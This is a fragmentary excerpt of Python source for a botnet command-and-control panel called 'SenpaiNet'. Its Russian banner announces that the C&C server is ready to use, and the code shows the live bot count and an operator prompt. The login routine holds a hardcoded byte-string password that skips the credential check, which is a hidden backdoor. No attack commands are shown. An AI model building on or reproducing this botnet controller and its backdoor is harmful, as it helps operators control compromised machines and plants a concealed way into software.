...
banner = '''
                    ...
                    *  C&C сервер полностью настроен  *
                    *    готов к работе в системе     *
                    *           Веселитесь            *
                     *********************************
        '''
...
def update_title(client, username):
    ...
    while 1:
        try:
            send(client, f'\33]0;SenpaiNet | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client):
    ...
    prompt = f'{Fore.LIGHTBLUE_EX}SenpaiNet {Fore.LIGHTWHITE_EX}$ '
...
def handle_client(client, address):
    send(client, f'\33]0;SenpaiNet | Login\a', False)
    ...
    if password != '\xff\xff\xff\xff\75':
        ...
        if not find_login(username, password):
            send(client, Fore.RED + 'неверные учетные данные')
            time.sleep(1)
            client.close()
            return
